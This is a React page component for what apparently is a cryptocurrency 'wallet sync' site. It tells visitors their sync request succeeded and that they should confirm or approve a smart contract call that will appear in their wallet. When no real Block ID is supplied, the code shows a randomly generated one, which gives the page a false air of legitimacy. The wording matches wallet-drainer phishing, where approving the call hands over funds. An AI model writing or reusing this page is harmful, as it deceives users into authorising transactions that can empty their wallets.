import { useLocation } from "wouter";
import { Card, CardContent } from "@/components/ui/card";
import { useEffect, useState } from "react";

export default function SyncSuccess() {
  const [location] = useLocation();
  const [blockId] = useState(() => {
    const params = new URLSearchParams(location.split('?')[1]);
    return params.get('blockId') || Math.random().toString(36).substring(2, 15);
  });

  return (
    <div className="min-h-screen bg-background py-12 dark">
      <div className="container mx-auto px-4">
        <main className="max-w-3xl mx-auto text-center">
          <Card className="border-2">
            <CardContent className="p-12">
              <h1 className="text-4xl font-bold mb-4 text-primary">
                Sync Request Successfully Sent!
              </h1>

              <p className="text-muted-foreground mb-8 text-lg">
                A Smart Contract Call will display on your Wallet's Dashboard within 5-10mins, 
                Confirm/Approve and you'll automatically be redirected to a broad list of DApps. 
                Simply select and add any of your choice to your wallet.
              </p>

              <div className="bg-muted p-4 rounded-lg">
                <p className="text-sm">Block ID: {blockId}</p>
              </div>
            </CardContent>
          </Card>
        </main>
      </div>
    </div>
  );
}